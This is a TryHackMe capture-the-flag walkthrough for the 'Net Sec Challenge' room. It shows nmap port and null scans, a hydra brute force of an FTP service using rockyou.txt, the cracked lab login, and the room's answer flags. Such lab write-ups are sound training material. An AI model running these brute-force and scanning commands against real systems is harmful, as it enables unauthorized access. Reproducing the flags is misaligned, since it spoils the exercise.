# Net Sec Challenge

[Net Sec Challenge Room](https://tryhackme.com/room/netsecchallenge)

Practice the skills you have learned in the Network Security module.

## Active Machine Information

| Title | IP Address |
| :----: | :----: |
| NetSecMod Room 09 Challenge v1.11 | 10.10.91.0 |

### Task 1

```bash
export IP=10.10.91.0
```

### Task 2

```bash
sudo nmap -A -p- -T4 -vv -oN initial.nmap $IP
```

Result: [initial.nmap](initial.nmap)

> `8080/tcp  open  http        syn-ack ttl 61 Node.js (Express middleware)`

> `10021/tcp open  ftp         syn-ack ttl 61 vsftpd 3.0.3`

> `|_http-server-header: lighttpd THM{web_server_25352}`

> `|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}`

```bash
hydra -l quinn -P /usr/share/wordlists/rockyou.txt -t 20 -s 10021 -v $IP ftp | tee quinn.hydra
```

Result: 

- [eddie.hydra](eddie.hydra)
- [quinn.hydra](quinn.hydra)

> `[10021][ftp] host: 10.10.91.0   login: quinn   password: andrea`

Using: `quinn:andrea`

```bash
ftp 10.10.91.0 10021
ls
get ftp_flag.txt
```

Result: [ftp_flag.txt](ftp_flag.txt)

> `THM{321452667098}`

```bash
sudo nmap -sN $IP
```

> `THM{f7443f99}`
